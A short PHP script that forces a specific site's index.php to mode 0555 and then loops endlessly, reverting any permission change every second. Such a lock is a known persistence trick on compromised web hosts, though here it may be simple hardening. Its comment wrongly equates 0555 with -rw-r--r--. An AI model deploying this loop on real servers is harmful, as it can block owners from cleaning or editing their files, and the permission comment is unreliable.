<?php

// Define the file to monitor
$file = "/data/sites/web/qualiwebbe/www/index.php";

// Define the desired permissions for the file
$file_permissions = 0555; // Equivalent to -rw-r--r--

// Function to set permissions for the file
function set_file_permissions($file, $file_permissions) {
    if (is_file($file)) {
        chmod($file, $file_permissions);
    }
}

// Set initial permissions for the file
set_file_permissions($file, $file_permissions);

// Monitor for changes in permissions
$previous_permissions = fileperms($file);
while (true) {
    // Get current permissions
    $current_permissions = fileperms($file);
    
    // Check if permissions have changed
    if ($previous_permissions != $current_permissions) {
        // Permissions have changed, revert to original permissions
        chmod($file, $file_permissions);
    }
    
    $previous_permissions = $current_permissions;

    // Sleep for a short interval
    sleep(1);
}

?>
